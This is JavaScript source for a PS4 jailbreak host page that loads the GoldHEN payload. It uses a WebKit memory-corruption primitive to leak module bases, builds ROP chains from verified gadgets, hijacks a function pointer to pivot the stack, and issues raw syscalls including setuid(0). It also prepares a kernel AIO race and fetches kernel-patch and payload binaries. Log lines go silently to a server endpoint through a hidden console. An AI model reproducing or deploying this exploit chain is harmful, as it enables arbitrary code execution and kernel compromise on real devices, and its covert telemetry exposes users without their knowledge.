import { establishPrimitive } from "./core.js";
import { installWindowP } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

function ensureHostConsole() {
    var out = document.getElementById("out");
    var st = document.getElementById("state");
    if (!out) {
        out = document.createElement("pre");
        out.id = "out";
        out.setAttribute(
            "style",
            "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
                "overflow:hidden;opacity:0;pointer-events:none;"
        );
        (document.body || document.documentElement).appendChild(out);
    }
    if (!st) {
        st = document.createElement("div");
        st.id = "state";
        st.setAttribute(
            "style",
            "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
                "overflow:hidden;opacity:0;pointer-events:none;"
        );
        (document.body || document.documentElement).appendChild(st);
    }
    return { outEl: out, stateEl: st };
}
var _hostCons = ensureHostConsole();
const outEl = _hostCons.outEl;
const stateEl = _hostCons.stateEl;
const lines = [];

function hostOk() {
    var m = document.getElementById("msgs");
    if (m) {
        m.innerHTML = "تم تفعيل GoldHEN  بنجاح ✔";
        m.style.color = "#2ed573";
    }
}

function hostFail() {
    var m = document.getElementById("msgs");
    if (m) {
        m.innerHTML = "فشل التفعيل! يرجى إعادة تشغيل جهاز PS4...";
        m.style.color = "#ff4757";
    }
}

function post(tag, detail) {
    try {
        const x = new XMLHttpRequest();
        x.open("POST", "t", true);
        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        x.send("PS4-S4Q&tag=" + encodeURIComponent(tag)
             + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
    } catch (e) { }
}

const VERBOSE = new URLSearchParams(location.search).get("verbose") === "1";

const PROSE = [
    / -- /, /\.\s/, /,\s+(which|so|and that|because|since|as that)\s/,
    /,\s+\w+\s+of\s+which\s/,
    /\s+(because|rather than|instead of|so that|which is|which means|which the|so the|with the aim)\s/,
    /\s+so\s+[a-z]/,
    /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) {
        const m = re.exec(s);
        if (m && m.index > 0) s = s.slice(0, m.index);
    }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
}
function mark(tag, detail) {
    detail = terse(detail);
    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
    const esc = function (t) {
        return String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;")
                        .replace(/>/g, "&gt;");
    };
    outEl.innerHTML = lines.map(function (l) {
        l = esc(l);
        const c = /FAIL|ERROR|THREW|MISMATCH|WRONG|MISSING|TIMEOUT|NOT-FOUND/i.test(l) ? "bad"
                : /SKIP|GAP|WOULD-HAVE-WON|WARN/i.test(l) ? "warn"
                : /OK|PROVEN|READY|pass|BASELINE/i.test(l) ? "ok" : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
    post(tag, detail);
}
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }

function check(name, ok, detail) {
    return ok;
}
function plausibleBase(v) { return v.hi > 0 && (v.low & 0x3fff) === 0; }
function hexByte(b) { return (b < 16 ? "0" : "") + (b & 0xff).toString(16); }
function hexBytes(a) {
    let s = "";
    for (let i = 0; i < a.length; ++i) s += (i ? " " : "") + hexByte(a[i]);
    return s;
}
function put(dv, at, v) {
    if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
    }
}
function sameI64(a, b) { return a.low >>> 0 === b.low >>> 0 && a.hi >>> 0 === b.hi >>> 0; }

function inImageAddr(v) { return !!v && (v.hi >>> 0) === 0xffffffff; }
function hx(n) { return "0x" + (n >>> 0).toString(16); }

const AF_INET = 2, SOCK_STREAM = 1;
const SOL_SOCKET = 0xffff, SO_REUSEADDR = 4, SO_LINGER = 0x80;
const IPPROTO_TCP = 6, TCP_INFO = 32, TCP_INFO_SIZE = 0xec, TCPS_ESTABLISHED = 4;
const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
const AIO_CMD_READ = 1, AIO_CMD_MULTI = 0x1000, AIO_PRIORITY_HIGH = 3;
const AIO_STATE_COMPLETE = 3, AIO_STATE_ABORTED = 4;
const NUM_REQS = 3, WORKER_NUM = 2, AIO_MAX_NUM = 0x80;
const AIO_RW_REQ_SIZE = 0x28, AIO_RW_REQ_NBYTE = 0x08, AIO_RW_REQ_FD = 0x20;
const MAIN_CORE = 7, RTP = 0x100, RTP_PRIO_REALTIME = 2;
const RTP_LOOKUP = 0, RTP_SET = 1;
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const JSVALUE_UNDEFINED = 0xa;
const SENT_LO = 0xc0de4e01, SENT_HI = 0x4eecafe0;
const AF_INET6 = 28, SOCK_DGRAM = 2;
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const IPV6_SOCK_NUM = 0x80;
const RTHDR_SIZE = 0x80;
const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
const IPV6_2292PKTOPTIONS = 25, IPV6_TCLASS = 61;
const IPV6_PKTINFO = 46, IPV6_NEXTHOP = 48;

const SO_SNDBUF = 0x1001, SO_RCVBUF = 0x1002;
const PEER_RCVBUF = 0x400, CLIENT_SNDBUF = 0x8000;

const PKTOPTS_PKTINFO = 0x10, PKTOPTS_TCLASS = 0xb0;
const KARW_MARKER = 0x1337;
const MARK_RELEASED = 0x5747e180;

const REQS3_OFF = 0x28;
const AR3_NUM_REQS = 0x00, AR3_REQS_LEFT = 0x04, AR3_STATE = 0x08;
const AR3_DONE = 0x0c, AR3_LOCK_FLAGS = 0x28, AR3_LOCK = 0x38;
const AIO_CMD_WRITE = 2;
const HANDLES_NUM = 0x100;
const LEAK_NUM_REQS = 6;
const EVF_ATTEMPTS = 0x80;

const AR2_CMD = 0x00, AR2_TICKET = 0x04, AR2_REQS1 = 0x10, AR2_INFO = 0x18;
const AR2_BATCH = 0x20, AR2_RESULT_RV = 0x30, AR2_RESULT_STATE = 0x38;
const AR2_RESULT_PAD = 0x3c, AR2_FILE = 0x40, AR2_UNK2 = 0x48;
const AR2_QENTRY = 0x50, AIO_ENTRY_SIZE = 0x80;

const SYS = {
    read: 3, write: 4, open: 5, close: 6, getpid: 20, accept: 30, socket: 97,
    setuid: 23, getuid: 24, geteuid: 25,
    connect: 98, bind: 104,
    setsockopt: 105, listen: 106, getsockopt: 118, socketpair: 135,
    nanosleep: 240, sched_yield: 331, thr_self: 432, rtprio_thread: 466,
    fcntl: 92, ioctl: 54,
    thr_suspend_ucontext: 632, thr_resume_ucontext: 633,
    evf_create: 538, evf_delete: 539, evf_set: 544, evf_clear: 545,
    cpuset_getaffinity: 487, cpuset_setaffinity: 488,
    aio_multi_delete: 662, aio_multi_wait: 663, aio_multi_poll: 664,
    aio_multi_cancel: 666, aio_submit_cmd: 669
};

const keepAlive = [];
let execAddr = null, origNative = null, mFunctionPatched = false;
let mainPivotAddr = null, mainSavedCell = null, cellCorrupted = false;
let workerArmed = false, workerWired = false, rpc = null;
let wMasterAddr = null, origWorkerVector = null;
let savedMask = null, maskChanged = false;
let savedPrio = null, prioChanged = false;
let restoreCtx = null;

let committed = false, rebootRequired = false;
let pipeM = null, pipeS = null;

let kFdtOfiles = null, pipeMFp = null, pipeSFp = null;

let kLeakFp = null;
let kv = null;

let repaired = false, cleanupDone = false;

let jailbroken = false, kpatched = false, payloadRunning = false;
let pipeFdsHeld = null;

let kvProbe = null;

let committed2 = false;
const pktoptsTwins = [];
const ipv6Socks = [];
const twinSocks = [];
const openFds = [];
const liveAioIds = [];

function makeRpc(worker) {
    let seq = 0;
    const pending = new Map();
    worker.onmessage = function (e) {
        const d = e.data || {};
        const slot = pending.get(d.id);
        if (!slot) return;
        pending.delete(d.id);
        clearTimeout(slot.timer);
        if (d.type === "err") slot.reject(new Error(String(d.value)));
        else slot.resolve(d.value);
    };
    worker.onerror = function (e) {
        mark("WORKER-ONERROR", (e && e.message) ? e.message : String(e));
    };
    return function call(name) {
        const args = Array.prototype.slice.call(arguments, 1);
        return new Promise(function (resolve, reject) {
            const id = seq++;
            const timer = setTimeout(function () {
                pending.delete(id);
                reject(new Error("timeout waiting for " + name));
            }, 15000);
            pending.set(id, { resolve: resolve, reject: reject, timer: timer });
            worker.postMessage({ id: id, name: name, args: args });
        });
    };
}

(async function () {
    let worker = null;
    let p = null, sc = null, stubOf = null;
    try {
        const params = new URLSearchParams(location.search);

        const fwResolved = offsetsFor(navigator.userAgent);
        const fwKey = fwResolved.key;
        const kpatchName = fwResolved.off && fwResolved.off.kpatch
            ? "slopkit/patches/" + fwResolved.off.kpatch
            : fwKey ? "slopkit/patches/" + fwKey.replace(".", "") + ".bin" : null;
        let kpatch = null;
        try {
            if (kpatchName) {
                const rsp = await fetch(kpatchName);
                if (rsp.ok) kpatch = new Uint8Array(await rsp.arrayBuffer());
            }
        } catch (e) {
            mark("KPATCH-FETCH-FAILED", (e && e.message) ? e.message : String(e));
        }

        const KPATCH_JMP_SITES = [];
        if (kpatch) {
            for (let i = 0; i + 7 <= kpatch.length; ++i) {
                if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
                if (kpatch[i + 6] !== 0xeb) continue;
                KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
                    | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
            }
        }
        mark("KPATCH-BLOB", kpatch
            ? kpatch.length + " bytes of " + kpatchName + " in hand, head "
                + hexBytes(kpatch.subarray(0, 12))
                + "    " + KPATCH_JMP_SITES.length + " gateable jump site(s): "
                + KPATCH_JMP_SITES.slice(0, 12)
                    .map(function (v) { return "0x" + v.toString(16); }).join(" ")
            : (kpatchName ? "NOT LOADED (" + kpatchName + ") -- stage 9 will not run"
                          : "no firmware key, so no blob name -- stage 9 will not run"));

        let payload = null;
        try {
            const prsp = await fetch("goldhen_2.4b18.10.bin");
            if (prsp.ok) payload = new Uint8Array(await prsp.arrayBuffer());
        } catch (e) {
            mark("PAYLOAD-FETCH-FAILED", (e && e.message) ? e.message : String(e));
        }
        mark("PAYLOAD-BLOB", payload
            ? "bytes=" + payload.length + " head=" + hexBytes(payload.subarray(0, 12))
                + (payload[0] === 0xe9 ? " entry=e9-jmp-rel32"
                                       : " entry=NOT-e9")
            : "NOT LOADED -- stage 10 will not run");

        const ITERS = params.has("iters") ? parseInt(params.get("iters"), 10) : 400;
        const SPRAY_NUM = params.has("spray")
            ? parseInt(params.get("spray"), 10) : 0x200;

        const STOP_PRECOMMIT = params.get("stop") === "precommit";

        const PATCH_SETTLE = params.has("patchsettle")
            ? parseInt(params.get("patchsettle"), 10) : 2000;
        const PAYLOAD_SETTLE = params.has("payloadsettle")
            ? parseInt(params.get("payloadsettle"), 10) : 2000;

        let settleTs = null;
        function settle(ms) {
            if (!(ms > 0) || !settleTs) return;
            settleTs.u8.fill(0);
            settleTs.dv.setUint32(0, Math.floor(ms / 1000), true);
            settleTs.dv.setUint32(8, (ms % 1000) * 1000000, true);
            sc(SYS.nanosleep, settleTs.addr, 0);
        }

        const ua = navigator.userAgent;
        const { key, off } = offsetsFor(ua);
        mark("FW", key || "(not a PS4 UA)");
        if (!off) {
            var m = document.getElementById("msgs");
            if (m) {
                m.innerHTML = 'غير مدعوم لهذا الإصدار: <span style="color: #ff4757;">'
                    + (key || "مجهول") + '</span>';
            }
            mark("NO-OFFSETS", key || "unknown");
            return;
        }

        mark("FW-STATUS", key + " -- " + (off.fw_status
            || "no status recorded in the offsets block."));
        mark("DRY-RUN-PLAN", "budget=" + ITERS + " spray=" + SPRAY_NUM
            + (STOP_PRECOMMIT
                ? "  -- ?stop=precommit: the second aio_multi_delete WILL BE "
                  + "WITHHELD. Nothing is freed twice and no reboot is owed."
                : "  -- ARMED: the worker issues a REAL aio_multi_delete"));

        state("running the primitive...", "warn");

        await new Promise(function (r) { setTimeout(r, 0); });
        const carrier = await establishPrimitive({
            maxAttempts: 6,

            onEvent: function (tag, detail, attempt) {
                mark(tag, (attempt != null ? '[' + attempt + '] ' : '')
                    + (detail || ''));
            }
        });
        installWindowP(carrier);
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark("PRIMITIVE-OK", "");

        const fnAddr = p.leakval(Math.expm1);
        execAddr = p.read8(fnAddr.add32(0x18));
        const nativeFn = p.read8(execAddr.add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const g = function (rva) { return webkitBase.add32(rva); };
        const libkernelBase = p.read8(g(off.wk___imp___error)).sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        if (!plausibleBase(webkitBase) || !plausibleBase(libkernelBase)) { throw new Error("a base looks wrong"); }

        const GADGETS = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3], false, true],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3], false, true],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3], false, true],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3], false, true],
            ["POP_R8_RET", off.wk_POP_R8_RET, [0x41, 0x58, 0xc3], true, true],
            ["POP_R9_RET", off.wk_POP_R9_RET, [0x41, 0x59, 0xc3], true, false],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3], false, true],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3], false, true],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
                [0x48, 0x89, 0x07, 0xc3], false, true],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3], false, true],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL,
                [0x48, 0x8b, 0x7e, 0x30, 0x48, 0x8b, 0x07, 0xff, 0x10], false, true],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18,
                [0x58, 0x48, 0x8b, 0x07, 0xff, 0x60, 0x18], false, true],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10,
                [0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10], false, true],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20,
                [0x48, 0x8b, 0x78, 0x08, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x20], false, true],

            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10,
                [0x48, 0x8b, 0x50, off.pivot_view_sp,
                 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10], false, true]
        ];
        const G = {};
        let fatal = false, gated = 0;
        for (let i = 0; i < GADGETS.length; ++i) {
            const name = GADGETS[i][0], rva = GADGETS[i][1], want = GADGETS[i][2];
            const rebasable = GADGETS[i][3], required = GADGETS[i][4];
            const rexTolerant = want[0] >= 0x40 && want[0] <= 0x4f;
            function readRun(base) {
                const got = []; let ok = true;
                for (let j = 0; j < want.length; ++j) {
                    const b = p.read1(g(base + j));
                    got.push(b);
                    if (b === want[j]) continue;
                    const rexOk = rexTolerant && j === 0 && (b & 0xf0) === 0x40
                        && (b & 0x09) === (want[j] & 0x09);
                    if (!rexOk) ok = false;
                }
                return { got: got, ok: ok };
            }
            let use = rva, r = readRun(rva);
            if (!r.ok && rebasable) {
                const alt = readRun(rva - 1);
                if (alt.ok) { use = rva - 1; r = alt; mark("GADGET-REBASED", name); }
            }
            if (r.ok) { gated++; G[name] = g(use); }
            else {
                if (required) fatal = true;
                mark("GADGET-BYTES", name + " @0x" + use.toString(16) + " got "
                    + hexBytes(r.got) + " want " + hexBytes(want) + "  MISMATCH");
            }
        }
        check("gadget-table-fits-module", !fatal,
            gated + "/" + GADGETS.length + " gated");
        if (fatal) { throw new Error("gadget bytes did not match"); }
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                           G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
        check("5-argument-calls-possible-pop-r8", !!argGadget[4], "");
        if (!argGadget[4]) { throw new Error("no pop r8"); }

        const SYS9 = { mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
        const wanted = [];
        for (const k in SYS) wanted.push(SYS[k]);
        for (const k in SYS9) wanted.push(SYS9[k]);
        state("scanning libkernel for syscall stubs...", "warn");
        const tScan = Date.now();
        const stubRva = new Map();

        let seeded = 0, seedBad = 0;
        if (off.k_stubs) {
            for (const numStr in off.k_stubs) {
                const num = +numStr, o = off.k_stubs[numStr];
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) {
                    seedBad++; continue;
                }
                const got = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
                if (got !== num) { seedBad++; continue; }
                stubRva.set(num, o); seeded++;
            }
            mark("STUB-TABLE", "seeded=" + seeded + "/"
                + Object.keys(off.k_stubs).length + " rejected=" + seedBad);
        }
        {
            const need = new Set(wanted.filter(function (n) {
                return !stubRva.has(n);
            }));
            for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49)
                    continue;
                const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
                if (need.has(num)) { stubRva.set(num, o); need.delete(num); }
            }
        }
        mark("STUB-SCAN", stubRva.size + "/" + wanted.length + " in "
            + (Date.now() - tScan) + " ms");
        const stubAddr = new Map();
        const missing = [];
        for (const k in SYS) {
            const num = SYS[k];
            if (!stubRva.has(num)) { missing.push(k); continue; }
            const a = libkernelBase.add32(stubRva.get(num));

            const plain = p.read1(a.add32(12)) === 0x72
                       && p.read1(a.add32(13)) === 0x01
                       && p.read1(a.add32(14)) === 0xc3;
            if (!plain) { missing.push(k + "(wrapper)"); continue; }
            stubAddr.set(num, a);
        }
        check("syscall-race-needs-plain-stub",
            missing.length === 0,
            missing.length ? "missing: " + missing.join(",")
                : Object.keys(SYS).length + "/" + Object.keys(SYS).length);
        if (missing.length) { throw new Error("missing syscall stubs"); }

        {
            const got9 = [];
            for (const k in SYS9) {
                const num = SYS9[k];
                if (!stubRva.has(num)) { got9.push(k + "=none"); continue; }
                const a = libkernelBase.add32(stubRva.get(num));
                stubAddr.set(num, a);
                const plain = p.read1(a.add32(12)) === 0x72
                           && p.read1(a.add32(13)) === 0x01
                           && p.read1(a.add32(14)) === 0xc3;
                got9.push(k + (plain ? "=stub" : "=wrapper"));
            }
            mark("STAGE9-STUBS", got9.join("  "));
        }

        function bufAddr(ab) {
            const cell = p.leakval(ab);
            const impl = p.read8(cell.add32(off.wk_ArrayBuffer_m_impl));
            return p.read8(impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
        }
        function eq(a, b) { return a.low === b.low && a.hi === b.hi; }

        function makeCtx(tag) {

            const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
            const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
            const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
            const c = {
                tag: tag, storeDv: new DataView(sb), pivotDv: new DataView(pb),
                stackDv: new DataView(kb), frameDv: new DataView(fb),
                stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb)
            };
            keepAlive.push(sb, pb, kb, fb, c.storeDv, c.pivotDv, c.stackDv,
                c.frameDv, c.stackU8, c.frameU8);
            c.S = bufAddr(sb); c.P = bufAddr(pb);
            c.K = bufAddr(kb); c.F = bufAddr(fb);
            const pairs = [[c.storeDv, c.S], [c.pivotDv, c.P],
                           [c.stackDv, c.K], [c.frameDv, c.F]];
            for (let i = 0; i < pairs.length; ++i) {
                const dv = pairs[i][0], ad = pairs[i][1];
                dv.setUint32(0, 0xdeadbeef, true);
                if (p.read4(ad) !== 0xdeadbeef) return null;
                p.write4(ad.add32(8), 0xfeedface);
                if (dv.getUint32(8, true) !== 0xfeedface) return null;
                dv.setUint32(0, 0, true); dv.setUint32(8, 0, true);
            }
            put(c.storeDv, 0x00, G.G1);
            put(c.storeDv, 0x08, c.P);
            put(c.storeDv, 0x10, G.G3);
            put(c.storeDv, 0x18, G.G2);
            put(c.pivotDv, 0x00, c.P);
            put(c.pivotDv, 0x10, G.G5);
            put(c.pivotDv, 0x20, G.G4);
            return c;
        }
        const mainCtx = makeCtx("main"), wrkCtx = makeCtx("worker");
        check("chain-contexts-round-tripped", !!mainCtx && !!wrkCtx, "");
        if (!mainCtx || !wrkCtx) { throw new Error("backing stores failed"); }

        function layout(c, insts, targetIdx) {
            c.stackU8.fill(0); c.frameU8.fill(0);
            let at = 0x2000 - 8 * insts.length;
            if (targetIdx >= 0 && (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0)) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
            put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }

        function chain(c) {
            const insts = [];
            let targetIdx = -1;
            const b = {
                store: function (addr, v) {
                    insts.push(G.POP_RAX_RET); insts.push(v);
                    insts.push(G.POP_RDI_RET); insts.push(addr);
                    insts.push(G.MOV_RDI_RAX_RET); return b;
                },
                args: function (list) {
                    for (let i = 0; i < list.length; ++i) {
                        insts.push(argGadget[i]); insts.push(list[i]);
                    }
                    return b;
                },
                call: function (target) {

                    const idx = insts.length;
                    if (targetIdx < 0) targetIdx = idx;
                    else if (((idx - targetIdx) & 1) !== 0)
                        throw new Error("chain: call slots " + targetIdx
                            + " and " + idx + " differ in parity, so one of "
                            + "them would be misaligned");
                    insts.push(target); return b;
                },
                saveRax: function (addr) {
                    insts.push(G.POP_RDI_RET); insts.push(addr);
                    insts.push(G.MOV_RDI_RAX_RET); return b;
                },
                end: function () {
                    insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
                    insts.push(G.LEAVE_RET);
                    return { insts: insts, targetIdx: targetIdx };
                }
            };
            return b;
        }
        function callInsts(c, target, args) {
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            const targetIdx = insts.length;
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(c.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            return { insts: insts, targetIdx: targetIdx };
        }

        const mFuncAt = execAddr.add32(off.wk_JSFunction_m_function);
        origNative = p.read8(mFuncAt);
        if (!sameI64(origNative, nativeFn)) { throw new Error("m_function moved under us"); }
        const mainPivotObj = {};
        keepAlive.push(mainPivotObj);
        mainPivotAddr = p.leakval(mainPivotObj);
        mainSavedCell = p.read8(mainPivotAddr);
        p.write8(mFuncAt, G.G0);
        mFunctionPatched = true;

        function fireMain(insts, targetIdx) {
            layout(mainCtx, insts, targetIdx);
            cellCorrupted = true;
            p.write8(mainPivotAddr, mainCtx.S);
            Math.expm1(mainPivotObj);
            p.write8(mainPivotAddr, mainSavedCell);
            cellCorrupted = false;
        }
        sc = function (num) {
            const args = Array.prototype.slice.call(arguments, 1);
            const t = stubAddr.get(num);
            if (!t) throw new Error("no stub for syscall " + num);
            const b = callInsts(mainCtx, t, args);
            fireMain(b.insts, b.targetIdx);
            const lo = mainCtx.frameDv.getUint32(0, true);
            const hi = mainCtx.frameDv.getUint32(4, true);
            return { lo: lo, hi: hi, i32: lo | 0 };
        };

        const rawSyscallAt = stubAddr.get(SYS.getpid).add32(7);
        function scRaw(num) {
            if (!rawSyscallAt) throw new Error("no raw syscall entry");
            const args = Array.prototype.slice.call(arguments, 1);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            insts.push(G.POP_RAX_RET); insts.push(num);
            const targetIdx = insts.length;
            insts.push(rawSyscallAt);
            insts.push(G.POP_RDI_RET); insts.push(mainCtx.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            fireMain(insts, targetIdx);
            const lo = mainCtx.frameDv.getUint32(0, true);
            const hi = mainCtx.frameDv.getUint32(4, true);
            return { lo: lo, hi: hi, i32: lo | 0 };
        }
        function scAny(num) {
            return stubAddr.has(num) ? sc.apply(null, arguments)
                                     : scRaw.apply(null, arguments);
        }

        function callAddr(target) {
            const args = Array.prototype.slice.call(arguments, 1);
            const b = callInsts(mainCtx, target, args);
            fireMain(b.insts, b.targetIdx);
            const lo = mainCtx.frameDv.getUint32(0, true);
            const hi = mainCtx.frameDv.getUint32(4, true);
            return { lo: lo, hi: hi, i32: lo | 0 };
        }

        layout(mainCtx, [G.POP_RDI_RET, mainCtx.F.add32(8), G.MOV_RDI_RAX_RET,
                         G.POP_RAX_RET, JSVALUE_UNDEFINED, G.LEAVE_RET], -1);
        cellCorrupted = true;
        p.write8(mainPivotAddr, mainCtx.S);
        Math.expm1(mainPivotObj);
        p.write8(mainPivotAddr, mainSavedCell);
        cellCorrupted = false;
        const wit = new int64(mainCtx.frameDv.getUint32(8, true),
                              mainCtx.frameDv.getUint32(12, true));
        check("main-thread-pivot-lands", sameI64(wit, mainCtx.P),
            wit + " want " + mainCtx.P);
        if (!sameI64(wit, mainCtx.P)) { throw new Error("pivot failed"); }
        const pid = sc(SYS.getpid).i32;
        mark("PID", String(pid));
        
        try {
            var uid0 = sc(SYS.getuid).i32;
            var su0 = sc(SYS.setuid, 0).i32;
            if (uid0 === 0 || su0 === 0) {
                mark("ALREADY-ROOT", "getuid=" + uid0 + " setuid(0)=" + su0);
                var m = document.getElementById("msgs");
                if (m) {
                    m.innerHTML = "GoldHEN مفعل بالفعل على الجهاز ✔";
                    m.style.color = "#2ed573";
                }
                return;
            }
        } catch (e) {}

        function alloc(len) {
            const ab = new ArrayBuffer(len);
            const rec = { ab: ab, dv: new DataView(ab), u8: new Uint8Array(ab),
                          addr: bufAddr(ab), len: len };
            keepAlive.push(ab, rec.dv, rec.u8);
            return rec;
        }
        const reqs1 = alloc(AIO_RW_REQ_SIZE * AIO_MAX_NUM);
        const outs = alloc(AIO_MAX_NUM * 4);
        const aioIds = alloc(NUM_REQS * 4);
        const sprayIds = alloc(SPRAY_NUM * 4);
        const blockIds = alloc(4);
        const servAddr = alloc(16);
        const lingerBuf = alloc(8);
        const optval = alloc(4);
        const info = alloc(TCP_INFO_SIZE);
        const infoLen = alloc(4);
        const maskBuf = alloc(0x10);

        const shared = alloc(0x40);
        const tsBuf = alloc(0x10);
        settleTs = alloc(0x10);
        const prioBuf = alloc(4);

        restoreCtx = { maskBuf: maskBuf, prioBuf: prioBuf };
        mark("BUFFERS", "reqs1=" + reqs1.addr + " outs=" + outs.addr
            + " aio_ids=" + aioIds.addr);

        function buildReqs1(count, fd) {
            reqs1.u8.fill(0);
            for (let i = 0; i < count; ++i) {
                const o = i * AIO_RW_REQ_SIZE;
                reqs1.dv.setUint32(o + AIO_RW_REQ_NBYTE, fd === -1 ? 0 : 1, true);
                reqs1.dv.setInt32(o + AIO_RW_REQ_FD, fd, true);
            }
        }

        prioBuf.dv.setUint16(0, 0xffff, true);
        prioBuf.dv.setUint16(2, 0xffff, true);
        const prioLookup = sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioBuf.addr).i32;
        savedPrio = [prioBuf.dv.getUint16(0, true), prioBuf.dv.getUint16(2, true)];
        maskBuf.u8.fill(0);
        const affLookup = sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
            new int64(0xffffffff, 0xffffffff), 0x10, maskBuf.addr).i32;
        savedMask = new int64(maskBuf.dv.getUint32(0, true),
                              maskBuf.dv.getUint32(4, true));
        check("inherited-thread-attributes-read",
            prioLookup === 0 && affLookup === 0,
            "prio {" + savedPrio + "}  mask " + savedMask
            + "  (cores " + (function () {
                const c = [];
                for (let i = 0; i < 32; ++i)
                    if (savedMask.low & (1 << i)) c.push(i);
                return c.join(",");
            })() + " are available to this process)");

        state("wiring the worker...", "warn");
        worker = new Worker("slopkit/rpc_worker.js");
        rpc = makeRpc(worker);
        await rpc("ping");
        const markerArr = await rpc("init", SENT_LO, SENT_HI);
        keepAlive.push(markerArr);
        const D = bufAddr(markerArr.buffer);
        if ((p.read4(D) >>> 0) !== SENT_LO) {
            check("transferred-store-worker-memory", false, "D=" + D);
            throw new Error("transfer did not preserve the store");
        }
        function ptrish(v) { return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }
        const storage = p.read8(D.add32(0x10));
        const markerCell = ptrish(storage) ? p.read8(storage.add32(8)) : null;
        if (!markerCell) throw new Error("worker memory wiring failed");

    } catch (e) {
        hostFail();
        mark("ERROR", (e && e.message) ? e.message : String(e));
    }
})();